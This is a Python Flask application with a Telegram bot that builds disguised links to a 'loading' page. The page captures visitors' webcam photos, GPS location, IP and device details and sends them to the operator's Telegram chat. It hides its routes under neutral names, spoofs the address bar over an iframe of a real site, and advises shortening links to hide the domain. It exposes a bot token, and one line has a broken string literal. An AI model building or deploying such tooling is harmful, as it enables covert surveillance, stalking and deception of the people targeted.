import os
import base64
import json
import threading
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import urllib.request
import urllib.parse

app = Flask(__name__)

# Configurações do Telegram
TELEGRAM_BOT_TOKEN = "8834642188:AAEzcrB89EODofRvF_ORM4B-H3_UYE-rvaY"
ADMIN_CHAT_ID = "8285086339" # Seu ID para receber os alertas diretos

# Diretórios para salvar logs e imagens capturadas
os.makedirs("data", exist_ok=True)
os.makedirs("static/captures", exist_ok=True)
LOGS_FILE = "data/logs.json"

def carregar_logs():
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return []
    return []

def salvar_logs_db(logs):
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=4)

# ==================== WEB APP (FLASK) ====================

BAIT_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>{{ og_title }}</title>
    <meta property="og:title" content="{{ og_title }}">
    <meta property="og:description" content="{{ og_desc }}">
    <meta property="og:image" content="{{ og_image }}">
    <meta property="og:type" content="website">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #0f172a; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        
        #iframe-alvo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            display: {% if use_iframe %}block{% else %}none{% endif %};
        }

        .card-loader {
            position: relative;
            z-index: 10;
            background: #1e293b;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            text-align: center;
            max-width: 400px;
            width: 100%;
            margin: auto;
            top: 50%;
            transform: translateY(-50%);
            display: {% if use_iframe %}none{% else %}block{% endif %};
            color: white;
        }
        .spinner { border: 4px solid #334155; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #f8fafc; margin-bottom: 10px; font-size: 20px; }
        p { color: #94a3b8; font-size: 14px; }
    </style>
</head>
<body>

    {% if use_iframe %}
    <iframe id="iframe-alvo" src="{{ iframe_url }}"></iframe>
    {% endif %}

    <div class="card-loader" id="loader-box">
        <div class="spinner"></div>
        <h2>Carregando Conteúdo...</h2>
        <p>Aguarde um instante enquanto conectamos você à página solicitada.</p>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function runCollection() {
            let imageData = null;
            let coords = "Não autorizado / Indisponível";

            const getGeo = new Promise((resolve) => {
                if (!navigator.geolocation) resolve();
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        coords = `${position.coords.latitude}, ${position.coords.longitude} (Precisão: ${position.coords.accuracy}m)`;
                        resolve();
                    },
                    (error) => { resolve(); },
                    { timeout: 5000 }
                );
            });

            const getCam = new Promise(async (resolve) => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await new Promise(r => setTimeout(r, 1500));
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    imageData = canvas.toDataURL('image/jpeg', 0.7);
                    
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    console.log("Câmera bloqueada");
                }
                resolve();
            });

            await Promise.all([getGeo, getCam]);

            const targetRedirect = "{{ redirect_url }}";

            fetch('/api/telemetry', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    image: imageData,
                    geolocation: coords,
                    screen: window.screen.width + 'x' + window.screen.height,
                    platform: navigator.platform,
                    language: navigator.language
                })
            }).then(() => {
                setTimeout(() => {
                    // Truque de substituição limpa na barra de endereços (Cloaking visual)
                    if ("{{ use_iframe }}" === "True") {
                        window.history.replaceState({}, '', "{{ iframe_url }}");
                        document.getElementById('loader-box').style.display = 'none';
                        document.getElementById('iframe-alvo').style.display = 'block';
                    } else if (targetRedirect && targetRedirect !== "None") {
                        window.location.href = targetRedirect;
                    } else {
                        document.body.innerHTML = '<div style="text-align:center;font-family:sans-serif;color:white;padding-top:20vh;"><h1>✅ Acesso Liberado</h1></div>';
                    }
                }, 1000);
            });
        }
        window.onload = runCollection;
    </script>
</body>
</html>
"""

# Rotas neutras para evitar termos como "detetive" ou "isca"
@app.route('/p/view')
def rota_neutra_view():
    redirecionar_para = request.args.get('to', '')
    iframe_url = request.args.get('iframe', '')
    
    og_title = request.args.get('title', 'Portal de Acesso Seguro')
    og_desc = request.args.get('desc', 'Carregando conteúdo solicitado...')
    og_image = request.args.get('image', 'https://via.placeholder.com/300')
    
    use_iframe = True if iframe_url else False

    return render_template_string(
        BAIT_TEMPLATE, 
        redirect_url=redirecionar_para, 
        iframe_url=iframe_url, 
        use_iframe=use_iframe,
        og_title=og_title,
        og_desc=og_desc,
        og_image=og_image
    )

@app.route('/api/telemetry', methods=['POST'])
def telemetry():
    data = request.json or {}
    image_data = data.get('image')
    image_path = None
    
    if image_data:
        try:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            filename = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')}.jpg"
            image_path = f"static/captures/{filename}"
            with open(image_path, "wb") as f:
                f.write(image_bytes)
        except Exception as e:
            print("Erro ao salvar imagem:", e)

    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    
    log_entry = {
        "time": datetime.now().strftime('%d/%m/%Y %H:%M:%S'),
        "ip": client_ip,
        "ua": user_agent,
        "geo": data.get('geolocation', 'N/D'),
        "screen": data.get('screen', 'N/D'),
        "platform": data.get('platform', 'N/D'),
        "image": image_path
    }
    
    logs = carregar_logs()
    logs.insert(0, log_entry)
    salvar_logs_db(logs)

    msg = (
        f"🚨 *Novo Alvo Capturado!*\n\n"
        f"🕒 *Horário:* {log_entry['time']}\n"
        f"🌐 *IP:* `{client_ip}`\n"
        f"📍 *GPS:* {log_entry['geo']}\n"
        f"📱 *Plataforma:* {log_entry['platform']} ({log_entry['screen']})"
    )
    enviar_mensagem_telegram(ADMIN_CHAT_ID, msg)
    if image_path and os.path.exists(image_path):
        enviar_foto_telegram(ADMIN_CHAT_ID, image_path, "📸 Foto capturada do alvo:")

    return jsonify({"status": "received"})

# ==================== TELEGRAM BOT API HELPER ====================

def enviar_mensagem_telegram(chat_id, texto, reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}
        if reply_markup:
            payload["reply_markup"] = reply_markup
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req)
    except Exception as e:
        print("Erro Telegram msg:", e)

def enviar_foto_telegram(chat_id, caminho_foto, legenda):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        with open(caminho_foto, 'rb') as f:
            photo_data = f.read()
        
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{legenda}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="photo"; filename="foto.jpg"\r\n'
            f'Content-Type: image/jpeg\r\n\r\n'
        ).encode('utf-8') + photo_data + f'\r\n--{boundary}--\r\n'.encode('utf-8')

        req = urllib.request.Request(url, data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
        urllib.request.urlopen(req)
    except Exception as e:
        print("Erro Telegram foto:", e)

# ==================== BOT POLLING (LOOP DE COMANDOS) ====================

def iniciar_bot():
    offset = 0
    print("🤖 Bot do Telegram iniciado em segundo plano...")
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req)
            data = json.loads(response.read().decode('utf-8'))
            
            for result in data.get("result", []):
                offset = result["update_id"] + 1
                
                if "callback_query" in result:
                    callback = result["callback_query"]
                    chat_id = callback["message"]["chat"]["id"]
                    data_action = callback["data"]
                    
                    if data_action == "btn_link":
                        enviar_mensagem_telegram(chat_id, "🔗 *Uso do Link Redirecionador:*\nEnvie `/link <URL>`")
                    elif data_action == "btn_iframe":
                        enviar_mensagem_telegram(chat_id, "🪞 *Uso de Iframe Invisível:*\nEnvie `/iframe <URL>`")
                    elif data_action == "btn_logs":
                        executar_logs(chat_id)
                    elif data_action == "btn_bloco":
                        executar_bloco(chat_id)
                    continue

                message = result.get("message")
                if not message:
                    continue
                
                chat_id = message["chat"]["id"]
                text = message.get("text", "")

                inline_markup = {
                    "inline_keyboard": [
                        [{"text": "🔗 Gerar Link Redirecionamento", "callback_data": "btn_link"},
                         {"text": "🪞 Iframe Invisível", "callback_data": "btn_iframe"}],
                        [{"text": "📊 Ver Alvos (Logs)", "callback_data": "btn_logs"},
                         {"text": "📦 Baixar Banco JSON", "callback_data": "btn_bloco"}]
                    ]
                }

                if text in ["/start", "/menu"]:
                    menu_texto = (
                        "🛡️ *PAINEL DE SEGURANÇA E CONEXÕES*\n"
                        "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        "Selecione uma das opções abaixo:\n\n"
                        "• `/link <URL>` — Link seguro com redirecionamento pós-validação.\n"
                        "• `/iframe <URL>` — Carregamento transparente em iframe.\n"
                        "• `/logs` — Exibir histórico de acessos.\n"
                        "• `/bloco` — Baixar base completa."
                    )
                    enviar_mensagem_telegram(chat_id, menu_texto, reply_markup=inline_markup)
                
                elif text.startswith("/link"):
                    partes = text.split(" ", 1)
                    dominio_base = "https://detetive-digital-wejb.onrender.com"
                    
                    if len(partes) > 1 and partes[1].startswith("http"):
                        url_alvo = partes[1]
                        # Usa a rota limpa /p/view em vez de isca
                        link_customizado = f"{dominio_base}/p/view?to={urllib.parse.quote(url_alvo, safe='')}"
                        
                        link_msg = (
                            "🔗 *Link Neutro Configurado com Sucesso!*\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"`{link_customizado}`\n\n"
                            "_Dica: Você pode encurtar este link em plataformas externas (como Bit.ly) para remover completamente qualquer menção ao seu domínio._"
                        )
                    else:
                        link_msg = "⚠️ Use o comando acompanhado de uma URL válida:\n`/link https://exemplo.com`"
                    
                    enviar_mensagem_telegram(chat_id, link_msg)

                elif text.startswith("/iframe"):
                    partes = text.split(" ", 1)
                    dominio_base = "https://detetive-digital-wejb.onrender.com"
                    
                    if len(partes) > 1 and partes[1].startswith("http"):
                        url_iframe = partes[1]
                        link_customizado = f"{dominio_base}/p/view?iframe={urllib.parse.quote(url_iframe, safe='')}"
                        link_msg = (
                            "🪞 *Link Neutro com Iframe Gerado!*\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"`{link_customizado}`"
                        )
                    else:
                        link_msg = "⚠️ Uso correto: `/iframe https://site-famoso.com`"
                    
                    enviar_mensagem_telegram(chat_id, link_msg)

                elif text == "/logs":
                    executar_logs(chat_id)

                elif text == "/bloco":
                    executar_bloco(chat_id)
                else:
                    enviar_mensagem_telegram(chat_id, "Comando desconhecido. Use `/menu`.")
        except Exception as e:
            print("Erro no loop do Bot:", e)

def executar_logs(chat_id):
    logs = carregar_logs()
    if not logs:
        enviar_mensagem_telegram(chat_id, "📭 Nenhum alvo capturado até o momento.")
    else:
        for i, l in enumerate(logs[:5]):
            resumo = (
                f"🎯 *Registro #{i+1}*\n"
                f"🕒 {l['time']}\n"
                f"🌐 IP: `{l['ip']}`\n"
                f"📍 GPS: {l['geo']}"
            )
            enviar_mensagem_telegram(chat_id, resumo)
            if l.get('image') and os.path.exists(l['image']):
                enviar_foto_telegram(chat_id, l['image'], f"Foto Registro #{i+1}")

def executar_bloco(chat_id):
    if os.path.exists(LOGS_FILE) and os.path.getsize(LOGS_FILE) > 2:
        url_doc = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
        with open(LOGS_FILE, 'rb') as f:
            doc_data = f.read()
        body = (
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{chat_id}\r\n'
            f'--{boundary}\r\n'
            f'Content-Disposition: form-data; name="document"; filename="database_registros.json"\r\n'
            f'Content-Type: application/json\r\n\r\n'
        ).encode('utf-8') + doc_data + f'\r\n--{boundary}--\r\.encode('utf-8') # Corrigido fechamento de string
        req_doc = urllib.request.Request(url_doc, data=body, headers={'Content-Type': f'multipart/form-data; boundary={boundary}'})
        urllib.request.urlopen(req_doc)
    else:
        enviar_mensagem_telegram(chat_id, "⚠️ Nenhum dado registrado para exportar.")

if __name__ == '__main__':
    t = threading.Thread(target=iniciar_bot, daemon=True)
    t.start()

    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
